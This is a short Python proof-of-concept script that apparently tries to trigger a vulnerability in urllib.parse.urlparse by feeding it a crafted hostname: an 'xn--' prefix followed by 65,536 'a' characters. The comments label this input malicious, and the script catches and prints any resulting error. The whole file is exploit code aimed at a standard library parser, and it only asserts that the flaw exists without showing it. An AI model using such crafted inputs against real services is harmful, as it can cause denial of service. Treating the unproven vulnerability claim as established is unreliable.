import urllib.parse

def vulnerable_function(url):
    return urllib.parse.urlparse(url).hostname

# Crafted input to trigger the vulnerability
malicious_url = "xn--" + "a" * 0x10000 + ".example.com"

try:
    vulnerable_function(malicious_url)
except Exception as e:
    print(f"Error: {e}")